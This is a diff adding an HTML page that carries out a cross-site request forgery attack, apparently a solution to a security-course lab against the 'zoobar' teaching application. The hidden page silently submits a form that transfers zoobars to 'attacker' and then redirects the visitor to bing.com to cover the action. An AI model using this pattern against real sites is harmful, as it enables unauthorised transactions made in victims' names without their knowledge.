@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <script>
+            var ready = false
+        </script>
+    </head>
+    <body style="display:none">
+        <iframe onload="if(ready){window.location.href='http://www.bing.com'}" name="frame"></iframe>
+        <form id="for" name="transferform" method="POST" action="http://zoobar.org/transfer.php" target="frame">
+            <input type=text name=recipient value="attacker"/>
+            <input type=text name=zoobars value="10" size=5/>
+            <input type=text name=submission value="true"/>
+        </form>
+        <script>
+            ready = true
+            form = document.getElementById("for").submit();
+        </script>
+    </body>
+</html>
